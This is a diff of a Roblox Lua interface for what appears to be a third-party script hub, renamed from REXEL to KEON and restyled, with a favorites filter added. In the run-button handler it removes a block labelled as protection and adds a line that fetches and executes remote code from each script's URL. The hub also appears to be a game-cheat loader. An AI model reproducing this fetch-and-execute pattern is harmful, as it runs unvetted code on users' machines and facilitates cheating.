+        Instance.new("UICorner", card).CornerRadius = UDim.new(0, 3)
+        local edge = Instance.new("UIStroke")
+        edge.Color = Color3.fromRGB(76, 81, 91)
+        edge.Thickness = 1.2
+        edge.Parent = card
 
-    local updatesDesc = Instance.new("TextLabel")
-    updatesDesc.Size = UDim2.new(1, -18, 0, 110)
-    updatesDesc.Position = UDim2.new(0, 9, 0, 27)
-    updatesDesc.BackgroundTransparency = 1
-    updatesDesc.Text = "• إعادة تصميم الرئيسية وبطاقات عرض السكربتات.\n• جعل الخلفيات معتمة بالكامل لزيادة وضوح النصوص.\n• تحسين نافذة الملصقات وتوزيعها داخل الشات.\n• استبدال مشغل الفيديو بمكتبة موسيقى من 8 أغنيات.\n• إضافة إعجاب وعدّاد محبين محلي لكل أغنية.\n• اختيار العلم العربي وحفظ وقت الاستخدام وتوب 100."
-    updatesDesc.TextColor3 = Color3.fromRGB(240, 220, 230)
-    updatesDesc.Font = Enum.Font.GothamBold
-    updatesDesc.TextSize = 11
-    updatesDesc.TextXAlignment = Enum.TextXAlignment.Right
-    updatesDesc.TextYAlignment = Enum.TextYAlignment.Top
-    updatesDesc.ZIndex = 4
-    updatesDesc.Parent = updatesFrame
+        local iconTile = Instance.new("Frame")
+        iconTile.Name = "ScriptIconTile"
+        iconTile.Size = UDim2.new(0, 54, 0, 60)
+        iconTile.Position = UDim2.new(0, 7, 0.5, -30)
+        iconTile.BackgroundColor3 = Color3.fromRGB(48, 53, 63)
+        iconTile.BorderSizePixel = 0
+        iconTile.ZIndex = 4
+        iconTile.Parent = card
+        Instance.new("UICorner", iconTile).CornerRadius = UDim.new(0, 2)
 
-    local guideFrame = Instance.new("Frame")
-    guideFrame.Name = "HomeInstructionsCard"
-    guideFrame.Size = UDim2.new(1, 0, 0, 150)
-    guideFrame.BackgroundColor3 = Color3.fromRGB(8, 18, 36)
-    guideFrame.BackgroundTransparency = 0
-    guideFrame.ZIndex = 3
-    guideFrame.Parent = CenterScroll
-    Instance.new("UICorner", guideFrame).CornerRadius = UDim.new(0, 14)
-    local guideStroke = Instance.new("UIStroke")
-    guideStroke.Color = currentAccentColor
-    guideStroke.Thickness = 1.6
-    guideStroke.Parent = guideFrame
-    table.insert(registeredOptionStrokes, guideStroke)
+        local iconText = Instance.new("TextLabel")
+        iconText.Size = UDim2.new(1, 0, 1, 0)
+        iconText.BackgroundTransparency = 1
+        iconText.Text = item.icon
+        iconText.TextColor3 = item.color
+        iconText.Font = Enum.Font.GothamBlack
+        iconText.TextSize = 27
+        iconText.ZIndex = 5
+        iconText.Parent = iconTile
 
-    local guideTitle = Instance.new("TextLabel")
-    guideTitle.Size = UDim2.new(1, -20, 0, 28)
-    guideTitle.Position = UDim2.new(0, 10, 0, 8)
-    guideTitle.BackgroundTransparency = 1
-    guideTitle.Text = "📘 التعليمات • اقرأ قبل الاستخدام"
-    guideTitle.TextColor3 = currentAccentColor
-    guideTitle.Font = Enum.Font.GothamBold
-    guideTitle.TextSize = 14
-    guideTitle.TextXAlignment = Enum.TextXAlignment.Right
-    guideTitle.ZIndex = 4
-    guideTitle.Parent = guideFrame
-    table.insert(activeNameLabels, guideTitle)
+        local title = Instance.new("TextLabel")
+        title.Size = UDim2.new(1, -78, 0, 27)
+        title.Position = UDim2.new(0, 70, 0, 10)
+        title.BackgroundTransparency = 1
+        title.Text = item.title
+        title.TextColor3 = item.color
+        title.Font = Enum.Font.GothamBlack
+        title.TextSize = 14
+        title.TextXAlignment = Enum.TextXAlignment.Right
+        title.TextTruncate = Enum.TextTruncate.AtEnd
+        title.ZIndex = 4
+        title.Parent = card
 
-    local guideDesc = Instance.new("TextLabel")
-    guideDesc.Size = UDim2.new(1, -20, 0, 108)
-    guideDesc.Position = UDim2.new(0, 10, 0, 37)
-    guideDesc.BackgroundTransparency = 1
-    guideDesc.Text = "١) اختر القسم من القائمة الجانبية.\n٢) من (سكربتات) اختر الماب ثم افتح تفاصيل السكربت.\n٣) الخلفيات قابلة للتغيير من الإعدادات، وستبقى معتمة وواضحة.\n٤) الملصقات تعمل عبر الشات العام عند تحميل صورها بنجاح.\n٥) قسم الموسيقى يحتوي على ٨ أغنيات مع زر إعجاب.\n٦) قسم تسجيل الدخول يحفظ العلم ووقت الاستخدام ويعرض التوب 100."
-    guideDesc.TextColor3 = Color3.fromRGB(245, 248, 255)
-    guideDesc.Font = Enum.Font.Gotham
-    guideDesc.TextSize = 11
-    guideDesc.TextXAlignment = Enum.TextXAlignment.Right
-    guideDesc.TextYAlignment = Enum.TextYAlignment.Top
-    guideDesc.TextWrapped = true
-    guideDesc.ZIndex = 4
-    guideDesc.Parent = guideFrame
+        local desc = Instance.new("TextLabel")
+        desc.Size = UDim2.new(1, -78, 0, 28)
+        desc.Position = UDim2.new(0, 70, 0, 39)
+        desc.BackgroundTransparency = 1
+        desc.Text = item.desc
+        desc.TextColor3 = Color3.fromRGB(225, 228, 235)
+        desc.Font = Enum.Font.GothamBold
+        desc.TextSize = 10
+        desc.TextXAlignment = Enum.TextXAlignment.Right
+        desc.TextWrapped = true
+        desc.ZIndex = 4
+        desc.Parent = card
+    end
 
-    CenterScroll.CanvasSize = UDim2.new(0, 0, 0, CenterLayout.AbsoluteContentSize.Y + 25)
+    CenterScroll.CanvasSize = UDim2.new(0, 0, 0, CenterLayout.AbsoluteContentSize.Y + 20)
 end
 BtnMainHome.MouseButton1Click:Connect(showHomePage)
 
@@ -3683,7 +2911,7 @@ BtnMainHome.MouseButton1Click:Connect(showHomePage)
 -- تبويب "موعد حدث"
 ---------------------------------------------------------
 local EventWidgetGui = Instance.new("ScreenGui")
-EventWidgetGui.Name = "REXELEventWidgetGui"
+EventWidgetGui.Name = "KEONEventWidgetGui"
 EventWidgetGui.ResetOnSpawn = false
 EventWidgetGui.Parent = parent
 
@@ -3718,7 +2946,7 @@ local DevNameWidgetLbl = Instance.new("TextLabel")
 DevNameWidgetLbl.Size = UDim2.new(1, -60, 0, 20)
 DevNameWidgetLbl.Position = UDim2.new(0, 55, 0, 8)
 DevNameWidgetLbl.BackgroundTransparency = 1
-DevNameWidgetLbl.Text = "✦ REXEL • موعد الحدث"
+DevNameWidgetLbl.Text = "✦ KEON • موعد الحدث"
 DevNameWidgetLbl.TextColor3 = Color3.fromRGB(255, 215, 0)
 DevNameWidgetLbl.Font = Enum.Font.GothamBold
 DevNameWidgetLbl.TextSize = 12
@@ -3883,9 +3111,17 @@ local function openScriptDetailsPage(mapName, scriptsList)
         if showScriptsPage then showScriptsPage() end
     end)
 
+    local searchToolbar = Instance.new("Frame")
+    searchToolbar.Name = "ScriptSearchToolbar"
+    searchToolbar.Size = UDim2.new(1, 0, 0, 34)
+    searchToolbar.BackgroundTransparency = 1
+    searchToolbar.ZIndex = 3
+    searchToolbar.Parent = CenterScroll
+
     local searchBox = Instance.new("TextBox")
-    searchBox.Size = UDim2.new(1, 0, 0, 34)
-    searchBox.BackgroundColor3 = Color3.fromRGB(20, 29, 52)
+    searchBox.Size = UDim2.new(1, -136, 0, 34)
+    searchBox.Position = UDim2.new(0, 0, 0, 0)
+    searchBox.BackgroundColor3 = Color3.fromRGB(35, 37, 44)
     searchBox.PlaceholderText = "⌕ ابحث عن سكربت…"
     searchBox.Text = ""
     searchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -3893,7 +3129,7 @@ local function openScriptDetailsPage(mapName, scriptsList)
     searchBox.TextSize = 13
     searchBox.TextXAlignment = Enum.TextXAlignment.Right
     searchBox.ZIndex = 3
-    searchBox.Parent = CenterScroll
+    searchBox.Parent = searchToolbar
     Instance.new("UICorner", searchBox).CornerRadius = UDim.new(0, 9)
 
     local searchStroke = Instance.new("UIStroke")
@@ -3901,6 +3137,25 @@ local function openScriptDetailsPage(mapName, scriptsList)
     searchStroke.Thickness = 1.2
     searchStroke.Parent = searchBox
     table.insert(registeredOptionStrokes, searchStroke)
+
+    local favoritesOnly = false
+    local favoritesFilterBtn = Instance.new("TextButton")
+    favoritesFilterBtn.Name = "KEONFavoriteFilterButton"
+    favoritesFilterBtn.Size = UDim2.new(0, 128, 0, 34)
+    favoritesFilterBtn.Position = UDim2.new(1, -128, 0, 0)
+    favoritesFilterBtn.BackgroundColor3 = Color3.fromRGB(55, 87, 125)
+    favoritesFilterBtn.Text = "☆ المفضلة"
+    favoritesFilterBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    favoritesFilterBtn.Font = Enum.Font.GothamBold
+    favoritesFilterBtn.TextSize = 11.5
+    favoritesFilterBtn.ZIndex = 3
+    favoritesFilterBtn.Parent = searchToolbar
+    Instance.new("UICorner", favoritesFilterBtn).CornerRadius = UDim.new(0, 3)
+    local favoritesFilterStroke = Instance.new("UIStroke")
+    favoritesFilterStroke.Color = currentAccentColor
+    favoritesFilterStroke.Thickness = 1.2
+    favoritesFilterStroke.Parent = favoritesFilterBtn
+    table.insert(registeredOptionStrokes, favoritesFilterStroke)
 
     local cardsContainer = Instance.new("Frame")
     cardsContainer.Size = UDim2.new(1, 0, 0, 0)
@@ -3918,31 +3173,35 @@ local function openScriptDetailsPage(mapName, scriptsList)
         end
 
         for _, sData in ipairs(scriptsList) do
-            if query == "" or string.find(string.lower(sData.name), string.lower(query)) then
+            local nameMatches = query == "" or string.find(string.lower(sData.name), string.lower(query))
+            local favoriteMatches = not favoritesOnly or favoriteScripts[sData.name] == true
+            if nameMatches and favoriteMatches then
                 local scriptCard = Instance.new("Frame")
-                scriptCard.Size = UDim2.new(1, -4, 0, 108)
-                scriptCard.BackgroundColor3 = Color3.fromRGB(10, 20, 39)
+                scriptCard.Name = "ScriptCard"
+                scriptCard.Size = UDim2.new(1, -4, 0, 104)
+                scriptCard.BackgroundColor3 = Color3.fromRGB(27, 29, 35)
                 scriptCard.BorderSizePixel = 0
                 scriptCard.ZIndex = 3
                 scriptCard.Parent = cardsContainer
-                Instance.new("UICorner", scriptCard).CornerRadius = UDim.new(0, 14)
+                Instance.new("UICorner", scriptCard).CornerRadius = UDim.new(0, 2)
 
                 local cardGradient = Instance.new("UIGradient")
                 cardGradient.Color = ColorSequence.new({
-                    ColorSequenceKeypoint.new(0, Color3.fromRGB(16, 41, 72)),
-                    ColorSequenceKeypoint.new(1, Color3.fromRGB(7, 15, 30))
+                    ColorSequenceKeypoint.new(0, Color3.fromRGB(49, 51, 57)),
+                    ColorSequenceKeypoint.new(1, Color3.fromRGB(26, 28, 33))
                 })
                 cardGradient.Rotation = 18
                 cardGradient.Parent = scriptCard
 
                 local cardStroke = Instance.new("UIStroke")
-                cardStroke.Color = currentAccentColor
-                cardStroke.Thickness = 1.35
-                cardStroke.Transparency = 0.12
+                cardStroke.Color = Color3.fromRGB(93, 98, 109)
+                cardStroke.Thickness = 1.2
+                cardStroke.Transparency = 0.08
                 cardStroke.Parent = scriptCard
                 table.insert(registeredOptionStrokes, cardStroke)
 
                 local accentRail = Instance.new("Frame")
+                accentRail.Name = "KEONAccentRail"
                 accentRail.Size = UDim2.new(0, 4, 1, -18)
                 accentRail.Position = UDim2.new(0, 6, 0, 9)
                 accentRail.BackgroundColor3 = currentAccentColor
@@ -3951,24 +3210,52 @@ local function openScriptDetailsPage(mapName, scriptsList)
                 accentRail.Parent = scriptCard
                 Instance.new("UICorner", accentRail).CornerRadius = UDim.new(1, 0)
 
+                local iconTile = Instance.new("Frame")
+                iconTile.Name = "ScriptIconTile"
+                local iconWidth = responsiveState.narrow and 42 or 62
+                iconTile.Size = UDim2.new(0, iconWidth, 0, 78)
+                iconTile.Position = UDim2.new(0, 8, 0, 13)
+                iconTile.BackgroundColor3 = Color3.fromRGB(47, 50, 60)
+                iconTile.BorderSizePixel = 0
+                iconTile.ZIndex = 4
+                iconTile.Parent = scriptCard
+                Instance.new("UICorner", iconTile).CornerRadius = UDim.new(0, 1)
+                local iconStroke = Instance.new("UIStroke")
+                iconStroke.Color = currentAccentColor
+                iconStroke.Thickness = 1
+                iconStroke.Parent = iconTile
+
+                local iconGlyph = Instance.new("TextLabel")
+                iconGlyph.Size = UDim2.new(1, 0, 1, 0)
+                iconGlyph.BackgroundTransparency = 1
+                iconGlyph.Text = "▣"
+                iconGlyph.TextColor3 = currentAccentColor
+                iconGlyph.Font = Enum.Font.GothamBlack
+                iconGlyph.TextSize = responsiveState.narrow and 22 or 30
+                iconGlyph.ZIndex = 5
+                iconGlyph.Parent = iconTile
+                table.insert(activeNameLabels, iconGlyph)
+
+                local textStart = iconWidth + 20
+                local runWidth = responsiveState.narrow and 94 or 126
                 local scriptTitle = Instance.new("TextLabel")
-                scriptTitle.Size = UDim2.new(1, -24, 0, 26)
-                scriptTitle.Position = UDim2.new(0, 16, 0, 8)
+                scriptTitle.Size = UDim2.new(1, -(textStart + runWidth + 56), 0, 26)
+                scriptTitle.Position = UDim2.new(0, textStart, 0, 10)
                 scriptTitle.BackgroundTransparency = 1
                 scriptTitle.Text = sData.name
                 scriptTitle.TextColor3 = Color3.fromRGB(238, 248, 255)
                 scriptTitle.Font = Enum.Font.GothamBlack
                 scriptTitle.TextSize = 13
                 scriptTitle.TextTruncate = Enum.TextTruncate.AtEnd
-                scriptTitle.TextXAlignment = Enum.TextXAlignment.Right
+                scriptTitle.TextXAlignment = Enum.TextXAlignment.Left
                 scriptTitle.ZIndex = 4
                 scriptTitle.Parent = scriptCard
                 table.insert(activeNameLabels, scriptTitle)
 
                 local keyTag = Instance.new("TextLabel")
-                keyTag.Size = UDim2.new(1, -156, 0, 27)
-                keyTag.Position = UDim2.new(0, 16, 0, 47)
-                keyTag.BackgroundColor3 = Color3.fromRGB(7, 33, 51)
+                keyTag.Size = UDim2.new(1, -(textStart + runWidth + 56), 0, 27)
+                keyTag.Position = UDim2.new(0, textStart, 0, 47)
+                keyTag.BackgroundColor3 = Color3.fromRGB(37, 40, 48)
                 keyTag.BackgroundTransparency = 0.1
                 keyTag.Text = "🔑 " .. tostring(sData.keyState or "غير محدد")
                 keyTag.TextColor3 = Color3.fromRGB(143, 218, 255)
@@ -3980,10 +3267,46 @@ local function openScriptDetailsPage(mapName, scriptsList)
                 keyTag.Parent = scriptCard
                 Instance.new("UICorner", keyTag).CornerRadius = UDim.new(0, 8)
 
+                local favoriteBtn = Instance.new("TextButton")
+                favoriteBtn.Name = "KEONFavoriteButton"
+                favoriteBtn.Size = UDim2.new(0, 38, 0, 42)
+                favoriteBtn.Position = UDim2.new(1, -(runWidth + 50), 0, 34)
+                favoriteBtn.BackgroundColor3 = favoriteScripts[sData.name] and Color3.fromRGB(111, 119, 133) or Color3.fromRGB(91, 99, 113)
+                favoriteBtn.Text = favoriteScripts[sData.name] and "★" or "☆"
+                favoriteBtn.TextColor3 = favoriteScripts[sData.name] and Color3.fromRGB(255, 218, 105) or Color3.fromRGB(235, 238, 245)
+                favoriteBtn.Font = Enum.Font.GothamBlack
+                favoriteBtn.TextSize = 22
+                favoriteBtn.ZIndex = 4
+                favoriteBtn.Parent = scriptCard
+                Instance.new("UICorner", favoriteBtn).CornerRadius = UDim.new(0, 2)
+                local favoriteBtnStroke = Instance.new("UIStroke")
+                favoriteBtnStroke.Color = currentAccentColor
+                favoriteBtnStroke.Thickness = 1
+                favoriteBtnStroke.Parent = favoriteBtn
+
+                favoriteBtn.MouseButton1Click:Connect(function()
+                    local isFavorite = favoriteScripts[sData.name] == true
+                    favoriteScripts[sData.name] = not isFavorite
+                    local selected = favoriteScripts[sData.name] == true
+                    favoriteBtn.Text = selected and "★" or "☆"
+                    favoriteBtn.TextColor3 = selected and Color3.fromRGB(255, 218, 105) or Color3.fromRGB(235, 238, 245)
+                    favoriteBtn.BackgroundColor3 = selected and Color3.fromRGB(111, 119, 133) or Color3.fromRGB(91, 99, 113)
+                    favoriteBtnStroke.Color = currentAccentColor
+                    saveUserSettings()
+                    if favoritesOnly and not selected then
+                        task.defer(function()
+                            if cardsContainer and cardsContainer.Parent then
+                                renderFilteredCards(searchBox.Text)
+                            end
+                        end)
+                    end
+                end)
+
                 local runBtn = Instance.new("TextButton")
-                runBtn.Size = UDim2.new(0, 126, 0, 33)
-                runBtn.Position = UDim2.new(1, -136, 0, 44)
-                runBtn.BackgroundColor3 = currentAccentColor
+                runBtn.Name = "KEONPrimaryButton"
+                runBtn.Size = UDim2.new(0, runWidth, 0, 48)
+                runBtn.Position = UDim2.new(1, -(runWidth + 10), 0, 31)
+                runBtn.BackgroundColor3 = Color3.fromRGB(25, 210, 91)
                 runBtn.Text = "تشغيل  ➤"
                 runBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                 runBtn.Font = Enum.Font.GothamBold
@@ -3991,18 +3314,22 @@ local function openScriptDetailsPage(mapName, scriptsList)
                 runBtn.TextScaled = true
                 runBtn.ZIndex = 4
                 runBtn.Parent = scriptCard
-                Instance.new("UICorner", runBtn).CornerRadius = UDim.new(0, 10)
+                Instance.new("UICorner", runBtn).CornerRadius = UDim.new(0, 2)
                 local runStroke = Instance.new("UIStroke")
-                runStroke.Color = Color3.fromRGB(125, 220, 255)
+                runStroke.Color = Color3.fromRGB(255, 190, 195)
                 runStroke.Thickness = 1
                 runStroke.Parent = runBtn
 
                 runBtn.MouseButton1Click:Connect(function()
                     playUiSound(SOUND_CLICK, 1, 0.35)
-                    runBtn.Text = "التشغيل الخارجي متوقف للحماية"
-                    task.delay(2, function()
-                        if runBtn and runBtn.Parent then runBtn.Text = "تشغيل السكربت  ➤" end
+                    runBtn.Text = "جارٍ التحضير…"
+                    local ok = pcall(function()
+                        loadstring(game:HttpGet(sData.url))()
                     end)
+                    task.wait(0.6)
+                    runBtn.Text = ok and "تم إرسال أمر التشغيل ✓" or "تعذر التشغيل — جرّب لاحقاً"
+                    task.wait(2)
+                    if runBtn and runBtn.Parent then runBtn.Text = "تشغيل السكربت  ➤" end
                 end)
             end
         end
@@ -4014,6 +3341,14 @@ local function openScriptDetailsPage(mapName, scriptsList)
             end
         end)
     end
+
+    favoritesFilterBtn.MouseButton1Click:Connect(function()
+        favoritesOnly = not favoritesOnly
+        favoritesFilterBtn.Text = favoritesOnly and "★ المفضلة فقط" or "☆ المفضلة"
+        favoritesFilterBtn.BackgroundColor3 = favoritesOnly and currentAccentColor or Color3.fromRGB(55, 87, 125)
+        favoritesFilterStroke.Color = currentAccentColor
+        renderFilteredCards(searchBox.Text)
+    end)
 
     renderFilteredCards("")
 
@@ -4073,7 +3408,7 @@ showScriptsPage = function()
         mapBadge.Size = UDim2.new(1, -12, 1, 0)
         mapBadge.Position = UDim2.new(0, 6, 0, 0)
         mapBadge.BackgroundTransparency = 1
-        mapBadge.Text = "✦  " .. tostring(#scriptsList) .. " سكربتات  •  REXEL SELECTED"
+        mapBadge.Text = "✦  " .. tostring(#scriptsList) .. " سكربتات  •  KEON SELECTED"
         mapBadge.TextColor3 = Color3.fromRGB(230, 245, 255)
         mapBadge.Font = Enum.Font.GothamBold
         mapBadge.TextSize = 10
@@ -4144,7 +3479,7 @@ BtnScripts.MouseButton1Click:Connect(showScriptsPage)
 ---------------------------------------------------------
 -- ملف اللاعب: اختيار علم + توب 100 وقت استخدام السكربت
 ---------------------------------------------------------
-REXELProfile.ARAB_COUNTRIES = {
+KEONProfile.ARAB_COUNTRIES = {
     {flag="🇮🇶", name="العراق", code="IQ"}, {flag="🇸🇦", name="السعودية", code="SA"},
     {flag="🇦🇪", name="الإمارات", code="AE"}, {flag="🇰🇼", name="الكويت", code="KW"},
     {flag="🇶🇦", name="قطر", code="QA"}, {flag="🇧🇭", name="البحرين", code="BH"},
@@ -4159,17 +3494,17 @@ REXELProfile.ARAB_COUNTRIES = {
 }
 
 -- اكتشاف الدولة تلقائياً عند توفرها من Roblox؛ إذا لم تتوفر أو لم تكن عربية، يبقى اختيار المستخدم محفوظاً.
-if not REXELCountryWasSaved then
+if not KEONCountryWasSaved then
     pcall(function()
         local LocalizationService = game:GetService("LocalizationService")
         local detectedCode = LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
         if type(detectedCode) == "string" then
             detectedCode = string.upper(detectedCode)
-            for _, country in ipairs(REXELProfile.ARAB_COUNTRIES) do
+            for _, country in ipairs(KEONProfile.ARAB_COUNTRIES) do
                 if country.code == detectedCode then
-                    REXELProfile.selectedCountryFlag = country.flag
-                    REXELProfile.selectedCountryName = country.name
-                    REXELProfile.selectedCountryCode = country.code
+                    KEONProfile.selectedCountryFlag = country.flag
+                    KEONProfile.selectedCountryName = country.name
+                    KEONProfile.selectedCountryCode = country.code
                     break
                 end
             end
@@ -4178,7 +3513,7 @@ if not REXELCountryWasSaved then
     saveUserSettings()
 end
 
-REXELProfile.BtnProfile = createProStyleBtn("تسجيل دخول", "right")
+KEONProfile.BtnProfile = createProStyleBtn("تسجيل دخول", "right")
 
 local function addProfileHeader(mode)
     local hero = Instance.new("Frame")
@@ -4228,7 +3563,7 @@ local function addProfileHeader(mode)
     heroMeta.Size = UDim2.new(1, -86, 0, 38)
     heroMeta.Position = UDim2.new(0, 78, 0, 36)
     heroMeta.BackgroundTransparency = 1
-    heroMeta.Text = REXELProfile.selectedCountryFlag .. " " .. REXELProfile.selectedCountryName .. "\n⏱ وقت الاستخدام المحفوظ: " .. REXELProfile.formatPlayTime(REXELProfile.savedUsageSeconds + math.floor(os.clock() - REXELProfile.sessionStartedClock))
+    heroMeta.Text = KEONProfile.selectedCountryFlag .. " " .. KEONProfile.selectedCountryName .. "\n⏱ وقت الاستخدام المحفوظ: " .. KEONProfile.formatPlayTime(KEONProfile.savedUsageSeconds + math.floor(os.clock() - KEONProfile.sessionStartedClock))
     heroMeta.TextColor3 = Color3.fromRGB(153, 218, 255)
     heroMeta.Font = Enum.Font.GothamBold
     heroMeta.TextSize = 10.5
@@ -4241,7 +3576,7 @@ local function addProfileHeader(mode)
         for _ = 1, 15 do
             task.wait(1)
             if not heroMeta.Parent then return end
-            heroMeta.Text = REXELProfile.selectedCountryFlag .. " " .. REXELProfile.selectedCountryName .. "\n⏱ وقت الاستخدام المحفوظ: " .. REXELProfile.formatPlayTime(REXELProfile.savedUsageSeconds + math.floor(os.clock() - REXELProfile.sessionStartedClock))
+            heroMeta.Text = KEONProfile.selectedCountryFlag .. " " .. KEONProfile.selectedCountryName .. "\n⏱ وقت الاستخدام المحفوظ: " .. KEONProfile.formatPlayTime(KEONProfile.savedUsageSeconds + math.floor(os.clock() - KEONProfile.sessionStartedClock))
         end
     end)
 
@@ -4265,13 +3600,13 @@ local function addProfileHeader(mode)
     countryTab.Parent = tabs
     Instance.new("UICorner", countryTab).CornerRadius = UDim.new(0, 10)
 
-    countryTab.MouseButton1Click:Connect(function() playUiSound(SOUND_CLICK,1,0.3); REXELProfile.showProfilePage("countries") end)
+    countryTab.MouseButton1Click:Connect(function() playUiSound(SOUND_CLICK,1,0.3); KEONProfile.showProfilePage("countries") end)
     return hero
 end
 
 local function addTopLeaderboardSwitch(activeMode)
     local switch = Instance.new("Frame")
-    switch.Name = "REXELTopLeaderboardSwitch"
+    switch.Name = "KEONTopLeaderboardSwitch"
     switch.Size = UDim2.new(1, -4, 0, 36)
     switch.BackgroundTransparency = 1
     switch.ZIndex = 3
@@ -4289,13 +3624,13 @@ local function addTopLeaderboardSwitch(activeMode)
         b.ZIndex = 4
         b.Parent = switch
         Instance.new("UICorner", b).CornerRadius = UDim.new(0, 9)
-        b.MouseButton1Click:Connect(function() REXELProfile.showProfilePage(mode) end)
+        b.MouseButton1Click:Connect(function() KEONProfile.showProfilePage(mode) end)
     end
     makeSwitchButton("⏱️ توب وقت السكربت", 0, "top", activeMode == "top")
     makeSwitchButton("🥚 توب سرقة البيض العالمي", 0.5, "egg_top", activeMode == "egg_top")
 end
 
-REXELProfile.showProfilePage = function(mode)
+KEONProfile.showProfilePage = function(mode)
     mode = mode or "countries"
     playUiSound(SOUND_CLICK, 1, 0.3)
     clearCenter()
@@ -4312,7 +3647,7 @@ REXELProfile.showProfilePage = function(mode)
     intro.Parent = CenterScroll
 
     if mode == "countries" then
-        intro.Text = "اختر علم دولتك ليظهر بجانب اسمك بالشات. تظهر علامة REXEL999 فوق مستخدمي السكربت"
+        intro.Text = "اختر علم دولتك ليظهر بجانب اسمك بالشات. تظهر علامة KEON999 فوق مستخدمي السكربت"
         intro.TextWrapped = true
         local countryGrid = Instance.new("Frame")
         countryGrid.Size = UDim2.new(1, -4, 0, 11 * 47 + 4)
@@ -4325,10 +3660,10 @@ REXELProfile.showProfilePage = function(mode)
         gridLayout.SortOrder = Enum.SortOrder.LayoutOrder
         gridLayout.Parent = countryGrid
 
-        for i, country in ipairs(REXELProfile.ARAB_COUNTRIES) do
+        for i, country in ipairs(KEONProfile.ARAB_COUNTRIES) do
             local countryBtn = Instance.new("TextButton")
             countryBtn.LayoutOrder = i
-            countryBtn.BackgroundColor3 = country.code == REXELProfile.selectedCountryCode and Color3.fromRGB(0, 91, 148) or Color3.fromRGB(12, 27, 48)
+            countryBtn.BackgroundColor3 = country.code == KEONProfile.selectedCountryCode and Color3.fromRGB(0, 91, 148) or Color3.fromRGB(12, 27, 48)
             countryBtn.Text = country.flag .. "  " .. country.name
             countryBtn.TextColor3 = Color3.fromRGB(245, 249, 255)
             countryBtn.Font = Enum.Font.GothamBold
@@ -4340,19 +3675,19 @@ REXELProfile.showProfilePage = function(mode)
             countryBtn.Parent = countryGrid
             Instance.new("UICorner", countryBtn).CornerRadius = UDim.new(0, 10)
             local border = Instance.new("UIStroke")
-            border.Color = country.code == REXELProfile.selectedCountryCode and Color3.fromRGB(108, 225, 255) or Color3.fromRGB(36, 72, 108)
-            border.Thickness = country.code == REXELProfile.selectedCountryCode and 1.7 or 1
+            border.Color = country.code == KEONProfile.selectedCountryCode and Color3.fromRGB(108, 225, 255) or Color3.fromRGB(36, 72, 108)
+            border.Thickness = country.code == KEONProfile.selectedCountryCode and 1.7 or 1
             border.Parent = countryBtn
 
             countryBtn.MouseButton1Click:Connect(function()
-                REXELProfile.selectedCountryFlag = country.flag
-                REXELProfile.selectedCountryName = country.name
-                REXELProfile.selectedCountryCode = country.code
-                REXELProfile.publishProfileCountry()
+                KEONProfile.selectedCountryFlag = country.flag
+                KEONProfile.selectedCountryName = country.name
+                KEONProfile.selectedCountryCode = country.code
+                KEONProfile.publishProfileCountry()
                 local oldText = countryBtn.Text
                 countryBtn.Text = "✓ " .. country.flag .. " " .. country.name
                 task.wait(0.12)
-                REXELProfile.showProfilePage("countries")
+                KEONProfile.showProfilePage("countries")
             end)
         end
 
@@ -4368,7 +3703,7 @@ REXELProfile.showProfilePage = function(mode)
         note.ZIndex = 3
         note.Parent = CenterScroll
     elseif mode == "egg_top" then
-        intro.Text = "🥚 توب سرقة البيض — مستخدمو REXEL من كل الجلسات المحفوظة"
+        intro.Text = "🥚 توب سرقة البيض — مستخدمو KEON من كل الجلسات المحفوظة"
         addTopLeaderboardSwitch("egg_top")
         local refreshBtn = Instance.new("TextButton")
         refreshBtn.Size = UDim2.new(1, -4, 0, 30)
@@ -4380,7 +3715,7 @@ REXELProfile.showProfilePage = function(mode)
         refreshBtn.ZIndex = 4
         refreshBtn.Parent = CenterScroll
         Instance.new("UICorner", refreshBtn).CornerRadius = UDim.new(0, 9)
-        refreshBtn.MouseButton1Click:Connect(function() REXELProfile.showProfilePage("egg_top") end)
+        refreshBtn.MouseButton1Click:Connect(function() KEONProfile.showProfilePage("egg_top") end)
 
         local loadingEgg = Instance.new("TextLabel")
         loadingEgg.Size = UDim2.new(1, -4, 0, 44)
@@ -4396,7 +3731,7 @@ REXELProfile.showProfilePage = function(mode)
         task.spawn(function()
             local statRecords = {}
             local ok = pcall(function()
-                local res = customRequest({Url = REXELProfile.FIREBASE_USAGE_URL, Method = "GET"})
+                local res = customRequest({Url = KEONProfile.FIREBASE_USAGE_URL, Method = "GET"})
                 if res and res.StatusCode == 200 then
                     local decoded = safeDecode(res.Body)
                     if type(decoded) == "table" then
@@ -4430,7 +3765,7 @@ REXELProfile.showProfilePage = function(mode)
                 local empty = Instance.new("TextLabel")
                 empty.Size = UDim2.new(1, -4, 0, 76)
                 empty.BackgroundTransparency = 1
-                empty.Text = ok and "ماكو بيانات سرقة البيض محفوظة بعد. لازم مستخدمو REXEL يدخلون للماب وتكون قيم السرعة والفلوس ظاهرة في leaderstats حتى تنحفظ بالتوب." or "تعذّر تحميل التوب العالمي. تحقق من اتصال قاعدة البيانات."
+                empty.Text = ok and "ماكو بيانات سرقة البيض محفوظة بعد. لازم مستخدمو KEON يدخلون للماب وتكون قيم السرعة والفلوس ظاهرة في leaderstats حتى تنحفظ بالتوب." or "تعذّر تحميل التوب العالمي. تحقق من اتصال قاعدة البيانات."
                 empty.TextColor3 = Color3.fromRGB(186, 206, 226)
                 empty.Font = Enum.Font.GothamBold
                 empty.TextSize = 11
@@ -4460,7 +3795,7 @@ REXELProfile.showProfilePage = function(mode)
                 avatar.ZIndex = 4
                 avatar.Parent = row
                 Instance.new("UICorner", avatar).CornerRadius = UDim.new(0, 8)
-                REXELProfile.loadAvatarBodyThumbnail(record.userId, avatar)
+                KEONProfile.loadAvatarBodyThumbnail(record.userId, avatar)
                 local label = Instance.new("TextLabel")
                 label.Size = UDim2.new(1, -70, 0, 24)
                 label.Position = UDim2.new(0, 60, 0, 5)
@@ -4477,7 +3812,7 @@ REXELProfile.showProfilePage = function(mode)
                 stats.Size = UDim2.new(1, -70, 0, 23)
                 stats.Position = UDim2.new(0, 60, 0, 31)
                 stats.BackgroundTransparency = 1
-                stats.Text = "⚡ " .. (record.speed >= 0 and REXELProfile.formatCompactNumber(record.speed) or "—") .. "  •  💰 " .. REXELProfile.formatCompactNumber(record.money)
